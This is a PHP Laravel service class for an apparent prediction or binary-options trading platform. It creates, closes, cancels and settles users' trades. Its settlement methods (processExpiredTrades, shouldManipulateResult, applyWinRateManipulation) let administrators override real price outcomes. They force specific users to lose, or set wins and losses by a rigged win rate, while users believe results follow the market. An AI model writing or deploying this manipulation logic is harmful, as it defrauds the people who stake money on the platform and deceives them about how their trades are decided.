<?php

namespace App\Services;

use App\Models\PredictionTrade;
use App\Models\TradingAsset;
use App\Models\UserTradeControl;
use App\Models\TradeSetting;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Support\Facades\DB;

class TradingService
{
    /**
     * Create a new prediction trade
     */
    public function createTrade(array $data): array
    {
        try {
            DB::beginTransaction();

            $user = User::findOrFail($data['user_id']);
            $asset = TradingAsset::findOrFail($data['trading_asset_id']);
            
            // Validate user can trade
            $validation = $this->validateTradeCreation($user, $data['trade_amount']);
            if (!$validation['success']) {
                return $validation;
            }

            // Calculate potential payout
            $payoutRate = TradeSetting::getDefaultPayout() / 100;
            $potentialPayout = $data['trade_amount'] * $payoutRate;

            // Set end time for fixed trades
            $endTime = null;
            if ($data['trade_type'] === 'fixed_time') {
                $endTime = Carbon::now()->addMinutes($data['duration_minutes'] ?? 5);
            }

            // Create the trade
            $trade = PredictionTrade::create([
                'user_id' => $data['user_id'],
                'trading_asset_id' => $data['trading_asset_id'],
                'prediction' => $data['prediction'],
                'trade_type' => $data['trade_type'],
                'trade_amount' => $data['trade_amount'],
                'entry_price' => $asset->current_price,
                'current_price' => $asset->current_price,
                'potential_payout' => $potentialPayout,
                'duration_minutes' => $data['duration_minutes'] ?? null,
                'start_time' => Carbon::now(),
                'end_time' => $endTime,
                'status' => 'active'
            ]);

            // Deduct trade amount from user balance
            $user->trading_balance -= $data['trade_amount'];
            $user->save();

            DB::commit();

            return [
                'success' => true,
                'trade' => $trade->load(['user', 'tradingAsset']),
                'message' => 'Trade created successfully'
            ];

        } catch (\Exception $e) {
            DB::rollBack();
            
            return [
                'success' => false,
                'message' => 'Failed to create trade: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Close a trade manually (for flexible trades)
     */
    public function closeTrade(int $tradeId, int $userId): array
    {
        try {
            $trade = PredictionTrade::where('id', $tradeId)
                ->where('user_id', $userId)
                ->where('status', 'active')
                ->first();

            if (!$trade) {
                return [
                    'success' => false,
                    'message' => 'Trade not found or cannot be closed'
                ];
            }

            if (!$trade->canClose()) {
                return [
                    'success' => false,
                    'message' => 'Trade cannot be closed at this time'
                ];
            }

            $trade->closeTrade($trade->current_price, true);

            return [
                'success' => true,
                'trade' => $trade->fresh(),
                'message' => 'Trade closed successfully'
            ];

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to close trade: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Cancel a trade and return investment
     */
    public function cancelTrade(int $tradeId, int $userId): array
    {
        try {
            DB::beginTransaction();

            $trade = PredictionTrade::where('id', $tradeId)
                ->where('user_id', $userId)
                ->where('status', 'active')
                ->first();

            if (!$trade) {
                return [
                    'success' => false,
                    'message' => 'Trade not found or already closed'
                ];
            }

            // Cancel the trade
            $trade->cancelTrade();

            // Return the investment to user balance
            $user = $trade->user;
            $user->trading_balance += $trade->trade_amount;
            $user->save();

            DB::commit();

            return [
                'success' => true,
                'trade' => $trade->fresh(),
                'message' => 'Trade cancelled successfully'
            ];

        } catch (\Exception $e) {
            DB::rollBack();
            
            return [
                'success' => false,
                'message' => 'Failed to cancel trade: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Process expired fixed-time trades
     */
    public function processExpiredTrades(): int
    {
        $expiredTrades = PredictionTrade::expired()->get();
        $processedCount = 0;

        foreach ($expiredTrades as $trade) {
            try {
                // Check if admin manipulation should be applied
                $shouldManipulate = $this->shouldManipulateResult($trade);
                
                if ($shouldManipulate) {
                    $this->applyWinRateManipulation($trade);
                } else {
                    $trade->closeTrade();
                }
                
                $processedCount++;
            } catch (\Exception $e) {
                \Log::error("Failed to process expired trade {$trade->id}: " . $e->getMessage());
            }
        }

        return $processedCount;
    }

    /**
     * Get user's active trades
     */
    public function getUserActiveTrades(int $userId): \Illuminate\Database\Eloquent\Collection
    {
        return PredictionTrade::forUser($userId)
            ->active()
            ->with(['tradingAsset'])
            ->orderBy('created_at', 'desc')
            ->get();
    }

    /**
     * Get user's trade history
     */
    public function getUserTradeHistory(int $userId, int $limit = 20): \Illuminate\Pagination\LengthAwarePaginator
    {
        return PredictionTrade::forUser($userId)
            ->whereIn('status', ['won', 'lost', 'cancelled'])
            ->with(['tradingAsset'])
            ->orderBy('created_at', 'desc')
            ->paginate($limit);
    }

    /**
     * Validate if user can create a new trade
     */
    private function validateTradeCreation(User $user, float $amount): array
    {
        // Check if user can trade
        if (!$user->canTrade()) {
            return [
                'success' => false,
                'message' => 'Trading is disabled for your account'
            ];
        }

        // Check trading balance
        if ($user->trading_balance < $amount) {
            return [
                'success' => false,
                'message' => 'Insufficient trading balance'
            ];
        }

        // Get user controls
        $controls = UserTradeControl::getForUser($user->id);

        // Validate trade amount
        if (!$controls->validateTradeAmount($amount)) {
            return [
                'success' => false,
                'message' => "Trade amount must be between $" . number_format($controls->min_trade_amount, 2) . 
                           " and $" . number_format($controls->max_trade_amount ?: 999999, 2)
            ];
        }

        // Check if user can open new trade
        if (!$controls->canOpenNewTrade()) {
            $message = $controls->getTradeValidationMessage();
            return [
                'success' => false,
                'message' => $message ?: 'Cannot open new trade'
            ];
        }

        return ['success' => true];
    }

    /**
     * Determine if trade result should be manipulated
     */
    private function shouldManipulateResult(PredictionTrade $trade): bool
    {
        if (!TradeSetting::isManipulationEnabled()) {
            return false;
        }

        $user = $trade->user;
        $controls = UserTradeControl::getForUser($user->id);

        // Always force lose if admin set this flag
        if ($controls->shouldForceLose()) {
            return true;
        }

        // Check if user has a forced win rate
        $forcedWinRate = $controls->getForcedWinRate();
        if ($forcedWinRate !== null) {
            $randomValue = mt_rand(1, 100);
            return $randomValue > $forcedWinRate;
        }

        // Use global win rate control
        $globalWinRate = TradeSetting::getGlobalWinRate();
        $randomValue = mt_rand(1, 100);
        
        return $randomValue > $globalWinRate;
    }

    /**
     * Apply win rate manipulation to a trade
     */
    private function applyWinRateManipulation(PredictionTrade $trade): void
    {
        $controls = UserTradeControl::getForUser($trade->user_id);
        
        if ($controls->shouldForceLose()) {
            $trade->forceLoss('Automated admin control');
        } else {
            // Determine if should win or lose based on win rate
            $forcedWinRate = $controls->getForcedWinRate() ?? TradeSetting::getGlobalWinRate();
            $randomValue = mt_rand(1, 100);
            
            if ($randomValue <= $forcedWinRate) {
                $trade->forceWin('Win rate manipulation');
            } else {
                $trade->forceLoss('Win rate manipulation');
            }
        }
    }
}
